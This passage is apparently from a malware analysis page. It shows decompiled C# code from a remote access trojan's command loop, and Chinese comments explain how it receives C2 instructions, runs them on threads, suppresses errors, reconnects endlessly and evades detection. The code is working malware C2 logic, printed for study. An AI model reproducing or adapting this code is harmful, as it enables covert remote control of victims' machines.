</div></div><div class="ec-line"><div class="code"><span class="indent">                                </span><span style="--0:#758575DD;--1:#A0ADA0">// 将长度字符串转为长整型（表示后续要接收的指令/数据长度）</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                </span><span style="--0:#BD976A;--1:#B07D48">dataLength</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">Conversions</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">ToLong</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">lengthStr</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                </span><span style="--0:#758575DD;--1:#A0ADA0">// 长度为0时，向C2服务器发送空响应，重置长度标记</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">dataLength</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">==</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">0L</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                    </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Send</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#C98A7D77;--1:#B5695977">""</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                    </span><span style="--0:#BD976A;--1:#B07D48">dataLength</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">-</span><span style="--0:#4C9A91;--1:#2F798A">1L</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">                                </span><span style="--0:#758575DD;--1:#A0ADA0">// 无后续数据则跳回循环开头</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">C</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Available</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">&#x3C;=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                    </span><span style="--0:#4D9375;--1:#1E754F">goto</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">IL_1B</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">                            </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">                            </span><span style="--0:#758575DD;--1:#A0ADA0">// 第二步：已解析出数据长度，读取对应字节数据</span></div></div><div class="ec-line"><div class="code"><span class="indent">                            </span><span style="--0:#4D9375;--1:#1E754F">else</span></div></div><div class="ec-line"><div class="code"><span class="indent">                            </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                </span><span style="--0:#758575DD;--1:#A0ADA0">// 创建字节数组，长度为“剩余待接收数据长度”（避免内存溢出）</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">b</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">new</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">byte</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">C</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Available</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">1</span><span style="--0:#666666;--1:#999999">];</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                </span><span style="--0:#4D9375;--1:#1E754F">long</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">remainingLength</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">dataLength</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">-</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">MeM</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Length</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#CB7676;--1:#AB5959">unchecked</span><span style="--0:#666666;--1:#999999">((</span><span style="--0:#4D9375;--1:#1E754F">long</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">b</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Length</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">></span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">remainingLength</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                    </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">b</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">new</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">byte</span><span style="--0:#666666;--1:#999999">[(</span><span style="--0:#4D9375;--1:#1E754F">int</span><span style="--0:#666666;--1:#999999">)(</span><span style="--0:#BD976A;--1:#B07D48">remainingLength</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">-</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">1L</span><span style="--0:#666666;--1:#999999">)</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">+</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">1</span><span style="--0:#666666;--1:#999999">];</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">                                </span><span style="--0:#758575DD;--1:#A0ADA0">// 从C2连接读取数据到字节数组</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                </span><span style="--0:#4D9375;--1:#1E754F">int</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">readBytes</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">C</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Client</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Receive</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">b</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">b</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Length</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                </span><span style="--0:#758575DD;--1:#A0ADA0">// 将读取的数据写入内存流（临时存储完整指令/数据）</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">MeM</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Write</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">b</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">readBytes</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">                                </span><span style="--0:#758575DD;--1:#A0ADA0">// 数据接收完成（内存流长度=预设长度）</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">MeM</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Length</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">==</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#BD976A;--1:#B07D48">dataLength</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                    </span><span style="--0:#BD976A;--1:#B07D48">dataLength</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">-</span><span style="--0:#4C9A91;--1:#2F798A">1L</span><span style="--0:#666666;--1:#999999">;</span><span style="--0:#DBD7CAEE;--1:#393A34">  </span><span style="--0:#758575DD;--1:#A0ADA0">// 重置长度标记</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                    </span><span style="--0:#758575DD;--1:#A0ADA0">// 新建线程异步执行指令（避免阻塞通信循环）</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                    </span><span style="--0:#5DA994;--1:#2E8F82">Thread</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">thread</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">new</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#5DA994;--1:#2E8F82">Thread</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#CB7676;--1:#AB5959">delegate</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#4D9375;--1:#1E754F">object</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">a0</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                        </span><span style="--0:#758575DD;--1:#A0ADA0">// OK.Ind是核心指令执行方法（接收字节数组，解析并执行恶意指令）</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                        </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Ind</span><span style="--0:#666666;--1:#999999">((</span><span style="--0:#4D9375;--1:#1E754F">byte</span><span style="--0:#666666;--1:#999999">[])</span><span style="--0:#BD976A;--1:#B07D48">a0</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                    </span><span style="--0:#666666;--1:#999999">},</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4C9A91;--1:#2F798A">1</span><span style="--0:#666666;--1:#999999">);</span><span style="--0:#DBD7CAEE;--1:#393A34">  </span><span style="--0:#758575DD;--1:#A0ADA0">// 线程栈大小设为1MB，规避检测</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                    </span><span style="--0:#BD976A;--1:#B07D48">thread</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Start</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">MeM</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">ToArray</span><span style="--0:#666666;--1:#999999">());</span><span style="--0:#DBD7CAEE;--1:#393A34">  </span><span style="--0:#758575DD;--1:#A0ADA0">// 传入完整数据</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                    </span><span style="--0:#BD976A;--1:#B07D48">thread</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Join</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#4C9A91;--1:#2F798A">100</span><span style="--0:#666666;--1:#999999">);</span><span style="--0:#DBD7CAEE;--1:#393A34">  </span><span style="--0:#758575DD;--1:#A0ADA0">// 等待线程执行100ms，不阻塞主线程</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">                                    </span><span style="--0:#758575DD;--1:#A0ADA0">// 清理内存流，准备接收下一条指令</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                    </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">MeM</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">Dispose</span><span style="--0:#666666;--1:#999999">();</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                    </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">MeM</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">new</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#5DA994;--1:#2E8F82">MemoryStream</span><span style="--0:#666666;--1:#999999">();</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">                                </span><span style="--0:#4D9375;--1:#1E754F">goto</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">IL_1B</span><span style="--0:#666666;--1:#999999">;</span><span style="--0:#DBD7CAEE;--1:#393A34">  </span><span style="--0:#758575DD;--1:#A0ADA0">// 跳回循环开头，继续接收数据</span></div></div><div class="ec-line"><div class="code"><span class="indent">                            </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#4D9375;--1:#1E754F">break</span><span style="--0:#666666;--1:#999999">;</span><span style="--0:#DBD7CAEE;--1:#393A34">  </span><span style="--0:#758575DD;--1:#A0ADA0">// 无数据时退出while循环</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#80A665;--1:#59873A">Block_9</span><span style="--0:#666666;--1:#999999">:;</span><span style="--0:#DBD7CAEE;--1:#393A34">  </span><span style="--0:#758575DD;--1:#A0ADA0">// 连接断开时的跳转标记</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">catch</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#5DA994;--1:#2E8F82">Exception</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">ex</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#758575DD;--1:#A0ADA0">// 静默捕获所有异常：无日志、无提示，避免暴露C2通信行为</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#758575DD;--1:#A0ADA0">// 连接断开后的清理+自动重连逻辑</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#4D9375;--1:#1E754F">do</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">try</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#758575DD;--1:#A0ADA0">// 清理插件/钩子对象（OK.PLG）：避免残留被安全软件检测</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#4D9375;--1:#1E754F">if</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">PLG</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">!=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">null</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#758575DD;--1:#A0ADA0">// 反射调用clear方法：混淆调用方式，规避特征检测</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#BD976A;--1:#B07D48">NewLateBinding</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">LateCall</span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">PLG</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">null</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#C98A7D;--1:#B56959">clear</span><span style="--0:#C98A7D77;--1:#B5695977">"</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">new</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">object</span><span style="--0:#666666;--1:#999999">[</span><span style="--0:#4C9A91;--1:#2F798A">0</span><span style="--0:#666666;--1:#999999">],</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">null</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">null</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">null</span><span style="--0:#666666;--1:#999999">,</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">true</span><span style="--0:#666666;--1:#999999">);</span></div></div><div class="ec-line"><div class="code"><span class="indent">                        </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">PLG</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#CB7676;--1:#AB5959">null</span><span style="--0:#666666;--1:#999999">;</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#4D9375;--1:#1E754F">catch</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#5DA994;--1:#2E8F82">Exception</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#80A665;--1:#59873A">ex2</span><span style="--0:#666666;--1:#999999">)</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">{</span></div></div><div class="ec-line"><div class="code"><span class="indent">                    </span><span style="--0:#758575DD;--1:#A0ADA0">// 静默捕获异常</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">                </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Cn</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">false</span><span style="--0:#666666;--1:#999999">;</span><span style="--0:#DBD7CAEE;--1:#393A34">  </span><span style="--0:#758575DD;--1:#A0ADA0">// 标记连接断开</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#758575DD;--1:#A0ADA0">// 循环调用OK.connect()重连C2服务器，直到重连成功</span></div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#4D9375;--1:#1E754F">while</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">(</span><span style="--0:#CB7676;--1:#AB5959">!</span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#80A665;--1:#59873A">connect</span><span style="--0:#666666;--1:#999999">());</span></div></div><div class="ec-line"><div class="code">
</div></div><div class="ec-line"><div class="code"><span class="indent">            </span><span style="--0:#BD976A;--1:#B07D48">OK</span><span style="--0:#666666;--1:#999999">.</span><span style="--0:#BD976A;--1:#B07D48">Cn</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#666666;--1:#999999">=</span><span style="--0:#DBD7CAEE;--1:#393A34"> </span><span style="--0:#4D9375;--1:#1E754F">true</span><span style="--0:#666666;--1:#999999">;</span><span style="--0:#DBD7CAEE;--1:#393A34">  </span><span style="--0:#758575DD;--1:#A0ADA0">// 重连成功，恢复连接状态标记</span></div></div><div class="ec-line"><div class="code"><span class="indent">        </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span class="indent">    </span><span style="--0:#666666;--1:#999999">}</span></div></div><div class="ec-line"><div class="code"><span style="--0:#666666;--1:#999999">}</span></div></div></code></pre><div class="copy"><button title="Copy to clipboard" data-copied="Copied!" data-code="public static void RC(){    checked  // 启用溢出检查（恶意代码常用，避免因数据溢出崩溃）    {        // 核心无限循环：永不退出，确保持续与C2服务器通信        for (;;)        {            OK.lastcap = &#x22;&#x22;;  // 清空捕获的临时数据（混淆变量，无实际语义）            // 检查是否已建立C2连接（OK.C是C2客户端对象，如Socket/TcpClient）            if (OK.C != null)            {                long dataLength = -1L;  // 存储待接收数据的总长度                int loopCount = 0;      // 循环计数，用于延迟规避检测                try                {                    for (;;)                    {                        IL_1B:  // 跳转标签：简化循环逻辑，恶意代码常用混淆手段                        loopCount++;                        // 每循环10次延迟1ms：规避安全软件对“高频循环”的行为检测                        if (loopCount == 10)                        {                            loopCount = 0;                            Thread.Sleep(1);                        }                        // 检查连接状态标记（OK.Cn=false表示连接断开），断开则退出内层循环                        if (!OK.Cn)                        {                            break;                        }                        // 检查C2连接的网络流是否有可读取数据                        if (OK.C.Available < 1)                        {                            // 无数据时阻塞等待（Poll(-1,0)表示无限等待数据）                            OK.C.Client.Poll(-1, 0);                        }                        // 有数据时，循环读取并解析                        while (OK.C.Available != 0)                        {                            // 第一步：未解析出数据长度时（dataLength=-1），先读取长度                            if (dataLength == -1L)                            {                                string lengthStr = &#x22;&#x22;;                                for (;;)                                {                                    // 逐字节读取，直到读到0（自定义协议：长度字符串以0结尾）                                    int byteData = OK.C.GetStream().ReadByte();                                    if (byteData == -1)  // 流结束（连接断开）                                    {                                        goto Block_9;  // 跳转到异常处理逻辑                                    }                                    if (byteData == 0)  // 长度字符串结束符                                    {                                        break;                                    }                                    // 拼接长度字符串（混淆转换：ChrW转字符再转整数再转字符串，增加逆向难度）                                    lengthStr += Conversions.ToString(Conversions.ToInteger(Strings.ChrW(byteData).ToString()));                                }                                // 将长度字符串转为长整型（表示后续要接收的指令/数据长度）                                dataLength = Conversions.ToLong(lengthStr);                                // 长度为0时，向C2服务器发送空响应，重置长度标记                                if (dataLength == 0L)                                {                                    OK.Send(&#x22;&#x22;);                                    dataLength = -1L;                                }                                // 无后续数据则跳回循环开头                                if (OK.C.Available <= 0)                                {                                    goto IL_1B;                                }                            }                            // 第二步：已解析出数据长度，读取对应字节数据                            else                            {                                // 创建字节数组，长度为“剩余待接收数据长度”（避免内存溢出）                                OK.b = new byte[OK.C.Available + 1];                                long remainingLength = dataLength - OK.MeM.Length;                                if (unchecked((long)OK.b.Length) > remainingLength)                                {                                    OK.b = new byte[(int)(remainingLength - 1L) + 1];                                }                                // 从C2连接读取数据到字节数组                                int readBytes = OK.C.Client.Receive(OK.b, 0, OK.b.Length, 0);                                // 将读取的数据写入内存流（临时存储完整指令/数据）                                OK.MeM.Write(OK.b, 0, readBytes);                                // 数据接收完成（内存流长度=预设长度）                                if (OK.MeM.Length == dataLength)                                {                                    dataLength = -1L;  // 重置长度标记                                    // 新建线程异步执行指令（避免阻塞通信循环）                                    Thread thread = new Thread(delegate(object a0)                                    {                                        // OK.Ind是核心指令执行方法（接收字节数组，解析并执行恶意指令）                                        OK.Ind((byte[])a0);                                    }, 1);  // 线程栈大小设为1MB，规避检测                                    